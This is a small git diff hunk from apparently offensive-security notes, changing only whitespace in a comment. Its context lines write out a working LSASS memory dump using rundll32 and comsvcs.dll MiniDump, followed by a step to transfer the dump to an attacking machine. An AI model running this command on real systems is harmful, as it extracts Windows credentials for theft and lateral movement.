@@ -59,7 +59,7 @@ Get-Process lsass
 
 # Creating lsass.dmp using an elevated PowerShell session
 rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
-# With this command, we are running rundll32.exe to call an exported function of comsvcs.dll which also calls the MiniDumpWriteDump (MiniDump) function to dump the LSASS process memory to a specified directory (C:\lsass.dmp). 
+# With this command, we are running rundll32.exe to call an exported function of comsvcs.dll which also calls the MiniDumpWriteDump (MiniDump) function to dump the LSASS process memory to a specified directory (C:\lsass.dmp).
 ```
 
 Transfer file to attacking machine.
